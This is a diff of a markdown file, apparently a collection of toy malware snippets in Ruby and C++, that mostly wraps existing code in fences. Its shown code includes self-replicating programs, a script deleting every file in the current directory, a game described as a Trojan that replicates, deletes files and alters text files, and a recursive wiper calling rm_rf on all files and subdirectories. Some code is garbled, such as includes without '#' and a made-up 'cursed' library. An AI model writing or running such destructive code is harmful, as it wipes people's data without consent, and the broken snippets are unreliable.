@@ -1,4 +1,7 @@
 # Code for Self Replication in Ruby
+
+``` ruby
+
 def replicate
   File.open(__FILE__, "w") do |f|
     f.puts self.to_s
@@ -7,8 +10,10 @@ end
 
 replicate
 
+```
 # Code for Replication in C++
 
+``` cpp
 include <fstream>
 include <string>
 
@@ -24,17 +29,19 @@ int main() {
   return 0;
 }
 
+```
 # Code for Flashing the Screen in Ruby
-  
+
+``` ruby
 require the 'curses' library to access curses functionality
 require 'cursed'
 
-##set up curses and the screen
+#set up curses and the screen
 Cursed.start do
   Cursed.init_screen
   Cursed.curs_set(0) # hide the cursor
 
-  ##infinite loop to flash the screen
+  #infinite loop to flash the screen
   loop do
     Cursed.attrset(Cursed::A_STANDOUT) # set the screen to standout mode
     Cursed.addstr("Flashing screen!") # write to the screen
@@ -48,9 +55,13 @@ Cursed.start do
   end
 end
 
+```
+
 #Code in C++
-include <curses.h> // include the curses library
-include <unistd.h> // for the sleep function
+
+``` cpp
+#include <curses.h> // include the curses library
+#include <unistd.h> // for the sleep function
 
 int main() {
   // set up curses and the screen
@@ -75,8 +86,11 @@ int main() {
   return 0;
 }
 
-# This is a simple Trojan program that will display a message on the victim's screen when run.
+```
 
+# This is a simple Trojan program that will display a message on the victim's screen
+
+``` ruby
 # Require the 'cursed' library to access curses functionality
 require 'cursed'
 
@@ -90,9 +104,11 @@ Cursed.start do
   Cursed.refresh # Update the screen
 end
 
+```
 
 # This is a simple malware program that will delete all the files in the current directory when run.
 
+``` ruby
 # Require the 'fileutils' library to access file manipulation functions
 require 'fileutils'
 
@@ -108,13 +124,15 @@ files.each do |file|
   FileUtils.rm(file)
 end
 
+```
 
 # This is a simple Trojan program disguised as a GUI game that performs the following actions when run:
-# - Replicates itself
-# - Deletes all the files in the current directory
-# - Displays a random image from a list of images
-# - Appends a message to all text files in the current directory
+- Replicates itself
+- Deletes all the files in the current directory
+- Displays a random image from a list of images
+- Appends a message to all text files in the current directory
 
+``` ruby
 # Require the 'gtk3' and 'fileutils' libraries to access GUI and file manipulation functions
 require 'gtk3'
 require 'fileutils'
@@ -160,9 +178,11 @@ end
 window.show_all
 Gtk.main
 
+```
 
 # This is a simple wiper malware program that will delete all the files in the current directory and all its subdirectories when run.
 
+``` ruby
 # Require the 'fileutils' library to access file manipulation functions
 require 'fileutils'
 
@@ -173,7 +193,11 @@ files_and_dirs = Dir.glob("**/*")
 files_and_dirs.each do |file_or_dir|
   FileUtils.rm_rf(file_or_dir)
 end
+```
 
+# Similar Program in C++
+
+``` cpp
 #include <iostream>
 #include <unistd.h> // for the sleep function
 #include <cstdlib> // for the system function
@@ -200,3 +224,4 @@ int main() {
   return 0;
 }
 
+```
